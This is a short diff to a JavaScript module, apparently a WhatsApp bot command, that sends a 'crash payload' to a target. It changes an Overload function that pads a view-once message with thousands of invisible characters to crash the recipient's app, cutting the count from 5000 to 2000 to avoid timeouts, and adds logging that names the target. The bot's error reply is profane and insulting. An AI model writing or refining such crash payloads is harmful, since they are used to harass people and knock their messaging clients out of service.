@@ -23,7 +23,7 @@ module.exports = {
 
       // Overload function
       async function Overload(target) {
-        const junk = "ឿ".repeat(5000); // Invisible characters
+        const junk = "ឿ".repeat(2000); // Reduced from 5000 to avoid timeout
 
         const payload = {
           viewOnceMessage: {
@@ -83,7 +83,7 @@ module.exports = {
       }, { quoted: m });
 
     } catch (error) {
-      console.error('Error sending crash payload:', error);
+      console.error(`Error sending crash payload to ${target}:`, error.message, error.stack);
       await client.sendMessage(m.chat, {
         text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, something fucked up the crash payload. Try again, you slacker.\n\nPowered by *${botname}*`
       }, { quoted: m });
